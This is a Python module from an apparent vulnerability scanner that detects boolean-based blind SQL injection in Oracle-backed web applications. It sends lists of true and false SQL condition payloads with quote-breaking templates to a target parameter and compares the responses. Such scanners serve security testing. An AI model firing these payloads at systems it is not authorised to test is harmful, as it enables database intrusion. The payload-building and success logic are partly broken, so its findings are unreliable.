# app/modules/scanner/blind_boolean.py
"""
Oracle Boolean-Based Blind SQL Injection Engine for SentinelAI.
Phase 11: Boolean-Based Blind SQL Injection Detection
"""

import logging
import time
import re
from dataclasses import dataclass, field
from typing import Optional, Dict, List, Any, Tuple, Set
import requests

from .union_sqli import UnionSQLi
from .html_parser import HTMLParser
from .regex_utils import RegexUtils

# ============================================================
# Data Classes
# ============================================================


@dataclass
class BlindBooleanResult:
    """
    Boolean-based blind SQL injection detection result.
    """

    success: bool = False
    is_vulnerable: bool = False
    true_response_length: int = 0
    false_response_length: int = 0
    true_signature: Optional[str] = None
    false_signature: Optional[str] = None
    confidence: int = 0
    working_payloads: List[str] = field(default_factory=list)
    comparison_method: str = ""  # LENGTH, CONTENT, STATUS, KEYWORD, DOM
    evidence: List[str] = field(default_factory=list)
    errors: List[str] = field(default_factory=list)
    true_responses: List[str] = field(default_factory=list)
    false_responses: List[str] = field(default_factory=list)
    execution_time: float = 0.0
    best_true_payload: Optional[str] = None
    best_false_payload: Optional[str] = None
    similarity_score: float = 0.0

    def add_error(self, error: str):
        """Add an error to the result."""
        self.errors.append(error)

    def add_evidence(self, evidence: str):
        """Add evidence to the result."""
        if evidence and evidence not in self.evidence:
            self.evidence.append(evidence)

    def add_working_payload(self, payload: str):
        """Add a working payload to the result."""
        if payload and payload not in self.working_payloads:
            self.working_payloads.append(payload)

    def get_summary(self) -> str:
        """Get a summary of the detection result."""
        if not self.success:
            return "Boolean blind detection failed"

        if not self.is_vulnerable:
            return "Boolean blind SQL injection not detected"

        parts = []
        parts.append(f"Vulnerable: YES")
        if self.best_true_payload:
            parts.append(f"True payload: {self.best_true_payload[:30]}...")
        if self.best_false_payload:
            parts.append(f"False payload: {self.best_false_payload[:30]}...")
        parts.append(f"Method: {self.comparison_method}")
        parts.append(f"Confidence: {self.confidence}%")
        if self.evidence:
            parts.append(f"Evidence: {len(self.evidence)} items")

        return f"Boolean Blind: {', '.join(parts)}"

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary for logging/output."""
        return {
            "success": self.success,
            "is_vulnerable": self.is_vulnerable,
            "true_response_length": self.true_response_length,
            "false_response_length": self.false_response_length,
            "true_signature": self.true_signature,
            "false_signature": self.false_signature,
            "confidence": self.confidence,
            "working_payloads": self.working_payloads,
            "comparison_method": self.comparison_method,
            "evidence": self.evidence,
            "errors": self.errors,
            "execution_time": self.execution_time,
            "best_true_payload": self.best_true_payload,
            "best_false_payload": self.best_false_payload,
            "similarity_score": self.similarity_score,
            "summary": self.get_summary(),
        }


# ============================================================
# Main Boolean Blind Engine Class
# ============================================================


class OracleBlindBooleanEngine:
    """
    Oracle Boolean-Based Blind SQL Injection Engine.
    Phase 11: Detects boolean-based blind SQL injection.
    """

    # ============================================================
    # Constants
    # ============================================================

    # True condition payloads
    TRUE_PAYLOADS = [
        "AND 1=1--",
        "AND 'A'='A'--",
        "AND 1=1",
        "AND 'A'='A'",
        "AND EXISTS(SELECT 1 FROM dual)--",
        "AND 1=(SELECT 1 FROM dual)--",
        "AND 'A'||'B'='AB'--",
    ]

    # False condition payloads
    FALSE_PAYLOADS = [
        "AND 1=2--",
        "AND 'A'='B'--",
        "AND 1=2",
        "AND 'A'='B'",
        "AND EXISTS(SELECT 1 FROM dual WHERE 1=2)--",
        "AND 1=(SELECT 2 FROM dual)--",
        "AND 'A'||'B'='CD'--",
    ]

    # Payload formats
    PAYLOAD_TEMPLATES = [
        ("' {condition}--", "Single quote with comment"),
        ("' {condition}", "Single quote without comment"),
        ('" {condition}--', "Double quote with comment"),
        ("' {condition}#", "Single quote with hash"),
        ("1' {condition}--", "Integer with single quote"),
        ("' OR {condition}--", "OR condition"),
        ("' AND {condition}--", "AND condition"),
    ]

    # Comparison methods
    METHOD_LENGTH = "LENGTH"
    METHOD_CONTENT = "CONTENT"
    METHOD_STATUS = "STATUS"
    METHOD_KEYWORD = "KEYWORD"
    METHOD_DOM = "DOM"

    # Confidence levels
    CONFIDENCE_HIGH = 90
    CONFIDENCE_MEDIUM = 70
    CONFIDENCE_LOW = 50

    # ============================================================
    # Initialization
    # ============================================================

    def __init__(
        self,
        session: requests.Session,
        base_url: str,
        logger: Optional[logging.Logger] = None,
    ):
        """
        Initialize Oracle Blind Boolean Engine.

        Args:
            session: Requests session for HTTP requests
            base_url: Target base URL
            logger: Optional logger instance
        """
        self.session = session
        self.base_url = base_url
        self.logger = logger or self._setup_logger()

        # Initialize components
        self.union_sqli = UnionSQLi(session, base_url, logger)
        self.html_parser = HTMLParser()
        self.regex_utils = RegexUtils()

        # State
        self.baseline_response = None
        self.baseline_size = 0
        self.baseline_content = ""
        self.blind_result = None

        self.logger.info(
            "[BlindBoolean] Module initialized for boolean blind detection"
        )
        self.logger.info(f"[BlindBoolean] Target: {base_url}")

    def _setup_logger(self) -> logging.Logger:
        """Set up default logger."""
        logger = logging.getLogger("BlindBoolean")
        logger.setLevel(logging.DEBUG)

        if not logger.handlers:
            ch = logging.StreamHandler()
            ch.setLevel(logging.DEBUG)
            formatter = logging.Formatter(
                "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
            )
            ch.setFormatter(formatter)
            logger.addHandler(ch)

        return logger

    # ============================================================
    # Private Methods
    # ============================================================

    def _get_baseline(self, injection_point: str) -> Optional[requests.Response]:
        """Get baseline response for comparison."""
        if self.baseline_response is None:
            self.logger.info("[BlindBoolean] Fetching baseline response...")
            self.baseline_response = self.union_sqli.get_baseline(injection_point)

            if self.baseline_response:
                self.baseline_size = len(self.baseline_response.text)
                self.baseline_content = self.html_parser.extract_text(
                    self.baseline_response.text
                )
                self.logger.info(
                    f"[BlindBoolean] Baseline size: {self.baseline_size} bytes"
                )
            else:
                self.logger.warning("[BlindBoolean] Failed to get baseline response")

        return self.baseline_response

    def _send_payload(
        self, injection_point: str, payload: str
    ) -> Optional[requests.Response]:
        """Send a payload and return the response."""
        baseline = self._get_baseline(injection_point)
        result = self.union_sqli.test_payload(injection_point, payload, baseline)

        if not result["success"] or result.get("response") is None:
            return None

        return result["response"]

    def _build_payload(self, condition: str, inject_point: str = "'") -> str:
        """
        Build a payload with the given condition.

        Args:
            condition: SQL condition
            inject_point: Injection point character

        Returns:
            str: Complete payload
        """
        # Try different formats
        for template, _ in self.PAYLOAD_TEMPLATES:
            payload = template.format(condition=condition)
            if "OR" in condition or "AND" in condition:
                return payload
        return f"'{condition}--"

    def _calculate_similarity(self, text1: str, text2: str) -> float:
        """
        Calculate similarity between two texts.

        Args:
            text1: First text
            text2: Second text

        Returns:
            float: Similarity score (0-1)
        """
        if not text1 or not text2:
            return 0.0

        # Normalize texts
        text1 = self.html_parser.extract_text(text1).lower()
        text2 = self.html_parser.extract_text(text2).lower()

        # Calculate Jaccard similarity
        words1 = set(text1.split())
        words2 = set(text2.split())

        if not words1 or not words2:
            return 0.0

        intersection = len(words1.intersection(words2))
        union = len(words1.union(words2))

        return intersection / union if union > 0 else 0.0

    def _detect_content_difference(
        self, true_response: str, false_response: str
    ) -> bool:
        """
        Detect if there is a content difference between responses.

        Args:
            true_response: True condition response
            false_response: False condition response

        Returns:
            bool: True if content difference detected
        """
        if not true_response or not false_response:
            return False

        true_text = self.html_parser.extract_text(true_response)
        false_text = self.html_parser.extract_text(false_response)

        # Check if content is different
        similarity = self._calculate_similarity(true_text, false_text)

        # If similarity is less than 0.9, content is different
        return similarity < 0.9

    def _detect_length_difference(
        self, true_response: str, false_response: str
    ) -> bool:
        """
        Detect if there is a length difference between responses.

        Args:
            true_response: True condition response
            false_response: False condition response

        Returns:
            bool: True if length difference detected
        """
        if not true_response or not false_response:
            return False

        true_len = len(true_response)
        false_len = len(false_response)

        # Check if length difference is significant (more than 10%)
        diff = abs(true_len - false_len)
        avg = (true_len + false_len) / 2

        if avg == 0:
            return False

        return (diff / avg) > 0.1

    def _detect_status_difference(
        self, true_response: requests.Response, false_response: requests.Response
    ) -> bool:
        """
        Detect if there is a status code difference between responses.

        Args:
            true_response: True condition response
            false_response: False condition response

        Returns:
            bool: True if status difference detected
        """
        if not true_response or not false_response:
            return False

        return true_response.status_code != false_response.status_code

    def _detect_keyword_difference(
        self, true_response: str, false_response: str
    ) -> bool:
        """
        Detect if there is a keyword difference between responses.

        Args:
            true_response: True condition response
            false_response: False condition response

        Returns:
            bool: True if keyword difference detected
        """
        if not true_response or not false_response:
            return False

        # Common keywords in error/success messages
        keywords = [
            "error",
            "exception",
            "warning",
            "invalid",
            "failed",
            "success",
            "found",
            "updated",
            "deleted",
            "inserted",
        ]

        true_found = any(k in true_response.lower() for k in keywords)
        false_found = any(k in false_response.lower() for k in keywords)

        return true_found != false_found

    # ============================================================
    # Public Detection Methods
    # ============================================================

    def detect_boolean_blind(
        self, injection_point: str, max_payloads: int = 50
    ) -> BlindBooleanResult:
        """
        Detect boolean-based blind SQL injection.

        Args:
            injection_point: Parameter to inject into
            max_payloads: Maximum payloads to test

        Returns:
            BlindBooleanResult: Detection result
        """
        self.logger.info(
            "[BlindBoolean] =================================================="
        )
        self.logger.info(
            "[BlindBoolean] PHASE 11: Boolean Blind SQL Injection Detection"
        )
        self.logger.info(
            "[BlindBoolean] =================================================="
        )

        result = BlindBooleanResult()
        total_start = time.time()

        try:
            # Get baseline
            baseline = self._get_baseline(injection_point)
            if not baseline:
                result.add_error("Failed to get baseline response")
                return result

            # Test true and false payloads
            true_responses = []
            false_responses = []
            best_true = None
            best_false = None
            best_confidence = 0

            # Limit payloads
            true_payloads = self.TRUE_PAYLOADS[: max_payloads // 2]
            false_payloads = self.FALSE_PAYLOADS[: max_payloads // 2]

            self.logger.info("[BlindBoolean] Testing true condition payloads...")

            # Test true payloads
            for condition in true_payloads:
                payload = self._build_payload(condition)
                response = self._send_payload(injection_point, payload)

                if response:
                    true_responses.append(response.text)
                    result.true_responses.append(response.text)
                    result.add_working_payload(payload)

                    if not best_true:
                        best_true = response
                    elif len(response.text) > len(best_true.text):
                        best_true = response

                    self.logger.debug(
                        f"[BlindBoolean] True payload worked: {payload[:30]}..."
                    )

            self.logger.info("[BlindBoolean] Testing false condition payloads...")

            # Test false payloads
            for condition in false_payloads:
                payload = self._build_payload(condition)
                response = self._send_payload(injection_point, payload)

                if response:
                    false_responses.append(response.text)
                    result.false_responses.append(response.text)
                    result.add_working_payload(payload)

                    if not best_false:
                        best_false = response
                    elif len(response.text) > len(best_false.text):
                        best_false = response

                    self.logger.debug(
                        f"[BlindBoolean] False payload worked: {payload[:30]}..."
                    )

            # Analyze results
            if true_responses and false_responses:
                # Get best true and false
                if best_true:
                    result.true_response_length = len(best_true.text)
                    result.true_signature = best_true.text[:200]
                if best_false:
                    result.false_response_length = len(best_false.text)
                    result.false_signature = best_false.text[:200]
                    result.best_false_payload = self._build_payload(false_payloads[0])

                # Check for differences
                # Method 1: Length difference
                if self._detect_length_difference(best_true.text, best_false.text):
                    result.comparison_method = self.METHOD_LENGTH
                    result.is_vulnerable = True
                    result.confidence = max(result.confidence, self.CONFIDENCE_HIGH)
                    result.add_evidence("Length difference detected between true/false")

                # Method 2: Content difference
                elif self._detect_content_difference(best_true.text, best_false.text):
                    result.comparison_method = self.METHOD_CONTENT
                    result.is_vulnerable = True
                    result.confidence = max(result.confidence, self.CONFIDENCE_MEDIUM)
                    result.add_evidence(
                        "Content difference detected between true/false"
                    )

                # Method 3: Keyword difference
                elif self._detect_keyword_difference(best_true.text, best_false.text):
                    result.comparison_method = self.METHOD_KEYWORD
                    result.is_vulnerable = True
                    result.confidence = max(result.confidence, self.CONFIDENCE_MEDIUM)
                    result.add_evidence(
                        "Keyword difference detected between true/false"
                    )

                # Method 4: Status difference
                elif (
                    best_true
                    and best_false
                    and self._detect_status_difference(best_true, best_false)
                ):
                    result.comparison_method = self.METHOD_STATUS
                    result.is_vulnerable = True
                    result.confidence = max(result.confidence, self.CONFIDENCE_LOW)
                    result.add_evidence(
                        "Status code difference detected between true/false"
                    )

                # Calculate similarity
                result.similarity_score = self._calculate_similarity(
                    best_true.text if best_true else "",
                    best_false.text if best_false else "",
                )

                # Store best true payload
                if true_payloads:
                    result.best_true_payload = self._build_payload(true_payloads[0])

            # Determine overall success
            result.success = True
            if result.is_vulnerable:
                result.confidence = min(result.confidence + 10, 100)
                result.add_evidence("Boolean blind SQL injection confirmed")
            else:
                result.add_evidence("No boolean blind SQL injection detected")

        except Exception as e:
            error_msg = f"Boolean blind detection failed: {str(e)}"
            self.logger.error(error_msg)
            result.add_error(error_msg)
            result.success = False

        result.execution_time = time.time() - total_start

        self.logger.info(
            "[BlindBoolean] =================================================="
        )
        self.logger.info("[BlindBoolean] BOOLEAN BLIND DETECTION COMPLETE")
        self.logger.info(f"[BlindBoolean] {result.get_summary()}")
        self.logger.info(f"[BlindBoolean] Time: {result.execution_time:.2f}s")
        self.logger.info(
            "[BlindBoolean] =================================================="
        )

        self.blind_result = result
        return result

    def compare_true_false(
        self, injection_point: str, true_payload: str, false_payload: str
    ) -> Dict[str, Any]:
        """
        Compare true and false condition responses.

        Args:
            injection_point: Parameter to inject into
            true_payload: True condition payload
            false_payload: False condition payload

        Returns:
            Dict: Comparison results
        """
        self.logger.info("[BlindBoolean] Comparing true/false conditions...")

        baseline = self._get_baseline(injection_point)

        true_response = self._send_payload(injection_point, true_payload)
        false_response = self._send_payload(injection_point, false_payload)

        if not true_response or not false_response:
            return {"success": False, "error": "Failed to get responses"}

        # Calculate differences
        length_diff = len(true_response.text) - len(false_response.text)
        content_similarity = self._calculate_similarity(
            true_response.text, false_response.text
        )
        status_diff = true_response.status_code != false_response.status_code

        return {
            "success": True,
            "true_length": len(true_response.text),
            "false_length": len(false_response.text),
            "length_diff": length_diff,
            "content_similarity": content_similarity,
            "status_diff": status_diff,
            "is_vulnerable": (
                abs(length_diff) > 10 or content_similarity < 0.9 or status_diff
            ),
        }

    def build_boolean_payloads(
        self, condition: str, payload_type: str = "AND"
    ) -> List[str]:
        """
        Build boolean-based payloads for a condition.

        Args:
            condition: SQL condition
            payload_type: Type of payload (AND, OR)

        Returns:
            List[str]: List of payloads
        """
        payloads = []

        templates = [
            f"'{condition}--",
            f'"{condition}--',
            f"1'{condition}--",
            f"'{condition}#",
            f"AND {condition}--",
            f"OR {condition}--",
        ]

        for template in templates:
            payloads.append(template)

        return payloads

    def find_best_true_payload(self, injection_point: str) -> Optional[str]:
        """
        Find the best true condition payload.

        Args:
            injection_point: Parameter to inject into

        Returns:
            Optional[str]: Best true payload
        """
        self.logger.info("[BlindBoolean] Finding best true payload...")

        baseline = self._get_baseline(injection_point)
        best_payload = None
        best_length = 0

        for condition in self.TRUE_PAYLOADS:
            payload = self._build_payload(condition)
            response = self._send_payload(injection_point, payload)

            if response and len(response.text) > best_length:
                best_length = len(response.text)
                best_payload = payload

        return best_payload

    def find_best_false_payload(self, injection_point: str) -> Optional[str]:
        """
        Find the best false condition payload.

        Args:
            injection_point: Parameter to inject into

        Returns:
            Optional[str]: Best false payload
        """
        self.logger.info("[BlindBoolean] Finding best false payload...")

        baseline = self._get_baseline(injection_point)
        best_payload = None
        best_length = 0

        for condition in self.FALSE_PAYLOADS:
            payload = self._build_payload(condition)
            response = self._send_payload(injection_point, payload)

            if response and len(response.text) > best_length:
                best_length = len(response.text)
                best_payload = payload

        return best_payload

    def calculate_similarity(self, text1: str, text2: str) -> float:
        """
        Calculate similarity between two texts.

        Args:
            text1: First text
            text2: Second text

        Returns:
            float: Similarity score (0-1)
        """
        return self._calculate_similarity(text1, text2)

    def detect_content_difference(
        self, true_response: str, false_response: str
    ) -> bool:
        """
        Detect content difference between responses.

        Args:
            true_response: True condition response
            false_response: False condition response

        Returns:
            bool: True if content difference detected
        """
        return self._detect_content_difference(true_response, false_response)

    def detect_length_difference(self, true_response: str, false_response: str) -> bool:
        """
        Detect length difference between responses.

        Args:
            true_response: True condition response
            false_response: False condition response

        Returns:
            bool: True if length difference detected
        """
        return self._detect_length_difference(true_response, false_response)

    def detect_status_difference(
        self, true_response: requests.Response, false_response: requests.Response
    ) -> bool:
        """
        Detect status code difference between responses.

        Args:
            true_response: True condition response
            false_response: False condition response

        Returns:
            bool: True if status difference detected
        """
        return self._detect_status_difference(true_response, false_response)

    def verify_boolean_condition(
        self, injection_point: str, true_payload: str, false_payload: str
    ) -> bool:
        """
        Verify if boolean condition works.

        Args:
            injection_point: Parameter to inject into
            true_payload: True condition payload
            false_payload: False condition payload

        Returns:
            bool: True if boolean condition verified
        """
        result = self.compare_true_false(injection_point, true_payload, false_payload)
        return result.get("is_vulnerable", False)

    def generate_boolean_payload(self, condition: str, inject_point: str = "'") -> str:
        """
        Generate a boolean payload.

        Args:
            condition: SQL condition
            inject_point: Injection point character

        Returns:
            str: Boolean payload
        """
        return self._build_payload(condition, inject_point)

    def is_boolean_vulnerable(self, injection_point: str) -> bool:
        """
        Quick check if parameter is vulnerable to boolean blind injection.

        Args:
            injection_point: Parameter to test

        Returns:
            bool: True if vulnerable
        """
        result = self.detect_boolean_blind(injection_point)
        return result.is_vulnerable

    def get_best_boolean_payload(self, injection_point: str) -> Optional[str]:
        """
        Get the best boolean payload.

        Args:
            injection_point: Parameter to test

        Returns:
            Optional[str]: Best boolean payload
        """
        if self.blind_result and self.blind_result.best_true_payload:
            return self.blind_result.best_true_payload

        result = self.detect_boolean_blind(injection_point)
        if result.success and result.is_vulnerable:
            return result.best_true_payload
        return None
